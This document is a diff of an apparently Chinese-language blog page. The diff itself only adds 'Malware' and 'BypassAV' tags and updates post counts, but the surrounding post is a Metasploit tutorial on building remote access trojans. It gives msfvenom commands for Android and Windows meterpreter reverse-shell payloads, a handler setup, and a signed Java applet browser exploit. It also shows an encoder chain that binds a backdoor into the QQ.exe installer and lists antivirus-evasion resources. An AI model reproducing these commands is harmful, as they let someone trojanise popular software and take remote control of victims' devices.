@@ -22,7 +22,7 @@
 
 
 
-  <meta name="keywords" content="RAT,Kali," />
+  <meta name="keywords" content="RAT,Malware,Kali,BypassAV," />
 
 
 
@@ -221,13 +221,13 @@
 <figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfvenom -p <span class="keyword">android/meterpreter/reverse_tcp </span><span class="keyword">LHOST=192.168.0.107 </span>LPORT=<span class="number">4444</span> R &gt; <span class="keyword">androTor.apk</span></span><br></pre></td></tr></table></figure>
 <p>设置服务器接收</p>
 <p>以下在msfconsole中操作:</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> exploit/multi/<span class="keyword">handler</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> PAYLOAD android/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> options</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> LHOST <span class="number">192.168</span><span class="number">.0</span><span class="number">.107</span> </span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> exploit/multi/<span class="keyword">handler</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> PAYLOAD android/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> options</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> LHOST <span class="number">192.168</span><span class="number">.0</span><span class="number">.107</span></span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 <h1 id="针对-Win-8"><a href="#针对-Win-8" class="headerlink" title="针对 Win 8"></a>针对 Win 8</h1><h2 id="java-applet"><a href="#java-applet" class="headerlink" title="java applet"></a>java applet</h2><p>可以参考以下<a href="https://www.youtube.com/watch?v=HM4X_iv6mRY" target="_blank" rel="external">视频演示</a></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/browser/java_signed_applet</span><br><span class="line"></span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line">set SRVHOST &lt;attacke<span class="string">r's ip addr&gt;</span><br><span class="line"></span><br><span class="line">set LHOST &lt;attacher'</span>s ip addr&gt;</span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 <h2 id="可执行文件"><a href="#可执行文件" class="headerlink" title="可执行文件"></a>可执行文件</h2><p>此处可以参考这个<a href="https://www.youtube.com/watch?v=DzHfsXuYPw0" target="_blank" rel="external">视频</a></p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -<span class="selector-tag">p</span> windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">0.107</span> LPORT=<span class="number">4444</span> -f exe -e x86/shikata_ga_nai -<span class="selector-tag">i</span> <span class="number">10</span> &gt; EXPLOIT.exe</span><br></pre></td></tr></table></figure>
 <h3 id="混合大法"><a href="#混合大法" class="headerlink" title="混合大法"></a>混合大法</h3><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">R</span> raw</span><br><span class="line">-c 编码次数</span><br><span class="line">-<span class="keyword">x</span> 这个是对某一个软件附加payload的选项。比如msfencode -i shell.exe –<span class="keyword">x</span> qq.exe 这个命令就是说我把一个叫做shell.exe的后门添加到了一个叫做qq.exe的软件里面。</span><br><span class="line">-<span class="keyword">k</span> 如果你使用了-<span class="keyword">x</span>和-<span class="keyword">k</span>参数。当你的payload运行后，它会从原始的主文件中分离出来，单独创建一个进程，并且运行。这个也是一个免杀的思路。</span><br><span class="line"></span><br><span class="line">msfpayload windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.0.107 LPORT=<span class="number">8080</span> <span class="keyword">R</span> \</span><br><span class="line">| msfencode -e x86/shikata_ga_nai -c <span class="number">5</span> -t raw \</span><br><span class="line">| msfencode -e x86/alpha_upper -c <span class="number">2</span> -t raw \</span><br><span class="line">| msfencode -e x86/shikata_ga_nai -c <span class="number">5</span> -t raw \</span><br><span class="line">| msfencode -e x86/countdown -c <span class="number">5</span> -t exe -<span class="keyword">x</span> /home/ray/dev/hack/backdoor/QQ.exe \</span><br><span class="line">-<span class="keyword">k</span> -o /home/ray/dev/hack/backdoor/QQHD.exe</span><br></pre></td></tr></table></figure>
-<h3 id="查看编码器"><a href="#查看编码器" class="headerlink" title="查看编码器"></a>查看编码器</h3><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --list</span><br><span class="line"></span><br><span class="line">x86/shikat<span class="built_in">a_ga</span>_nai </span><br><span class="line">x86/alph<span class="built_in">a_upper</span></span><br><span class="line">x86/countdown</span><br></pre></td></tr></table></figure>
+<h3 id="查看编码器"><a href="#查看编码器" class="headerlink" title="查看编码器"></a>查看编码器</h3><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --list</span><br><span class="line"></span><br><span class="line">x86/shikat<span class="built_in">a_ga</span>_nai</span><br><span class="line">x86/alph<span class="built_in">a_upper</span></span><br><span class="line">x86/countdown</span><br></pre></td></tr></table></figure>
 <h3 id="文件混合"><a href="#文件混合" class="headerlink" title="文件混合"></a>文件混合</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -<span class="selector-tag">a</span> x86 --platform windows -x /home/ray/dev/hack/backdoor/QQ<span class="selector-class">.exe</span> -k -<span class="selector-tag">p</span> windows/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">0.107</span> lport=<span class="number">8080</span> -<span class="selector-tag">b</span> <span class="string">"\x00"</span> -f exe -e x86/shikata_ga_nai -<span class="selector-tag">i</span> <span class="number">17</span> -o qqbd.exe</span><br></pre></td></tr></table></figure>
 <h1 id="bypass-AV"><a href="#bypass-AV" class="headerlink" title="bypass AV"></a>bypass AV</h1><p>主要以360为测试对象，对于特征查杀，Meterpreter基本可以依靠编码器/加密通过，不过行为查杀较难通过。</p>
 <p>[1] <a href="https://www.91ri.org/6169.html" target="_blank" rel="external">那些年一起绕过的杀软</a><br>[2] <a href="https://www.91ri.org/6342.html" target="_blank" rel="external">好免杀，hyperion造</a><br>[3] <a href="https://www.91ri.org/7798.html" target="_blank" rel="external">闲谈 bypass AV</a><br>[4] <a href="https://www.91ri.org/6877.html" target="_blank" rel="external">encode msf shellcode绕过杀毒</a><br>[5] <a href="https://www.91ri.org/6227.html" target="_blank" rel="external">Veil—绕过杀毒软件的payload生成器</a><br>[6] <a href="http://jingyan.baidu.com/article/afd8f4de6780ce34e386e97e.html" target="_blank" rel="external">UPX以及数字签名</a></p>
@@ -242,7 +242,11 @@
           
             <a href="/tags/RAT/"> #RAT </a>
           
+            <a href="/tags/Malware/"> #Malware </a>
+          
             <a href="/tags/Kali/"> #Kali </a>
+          
+            <a href="/tags/BypassAV/"> #BypassAV </a>
           
         </div>
       
@@ -348,7 +352,7 @@
         <div class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">423</span>
+              <span class="site-state-item-count">424</span>
               <span class="site-state-item-name">文章</span>
             </a>
           </div>
@@ -362,7 +366,7 @@
 
           <div class="site-state-item site-state-tags">
             <a href="/tags">
-              <span class="site-state-item-count">131</span>
+              <span class="site-state-item-count">133</span>
               <span class="site-state-item-name">標籤</span>
               </a>
           </div>
